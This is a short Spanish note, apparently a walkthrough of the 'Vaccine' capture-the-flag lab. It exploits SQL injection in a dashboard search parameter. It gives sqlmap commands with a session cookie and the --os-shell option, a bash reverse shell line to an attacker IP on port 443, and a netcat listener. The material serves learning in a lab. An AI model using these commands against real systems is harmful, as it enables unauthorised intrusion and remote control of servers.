# SQLI con [[sqlmap NO USAR]] y mandamos una [[Reverse shell]]

Al poner una ' en la parte de search nos aparece este error

![[Vaccine12.png]]


```
ACLARACION IMPORTANTE: En la parte de cookie, poner el que tenga cada uno, desde la pagina logeado como administrador apretar CTRL + SHIFT + I y ver las cookies
sqlmap -u 'http://10.129.163.241/dashboard.php?search=any+query' --cookie="PHPSESSID=rmqiliocl577tgkamdu19smmbe" -v 3        / Primero usar este comando que va a hacer el analisis
sqlmap -u 'http://10.129.163.241/dashboard.php?search=any+query' --cookie="PHPSESSID=rmqiliocl577tgkamdu19smmbe" -v 3 --os-shell           /Agregando el parametro de os shell, nos va a dejar ejecutar comandos
bash -c 'bash -i >& /dev/tcp/10.10.16.17/443 0>&1'                 / Este es el comando que vamos a poner para usar la revershell
```
Recordar estar en escucha con [[nc -nlvp 443]] para la [[Reverse shell]]
El cookie seria el value de PHPSESSID


![[Vaccine14.png]]

![[Vaccine13.png]]
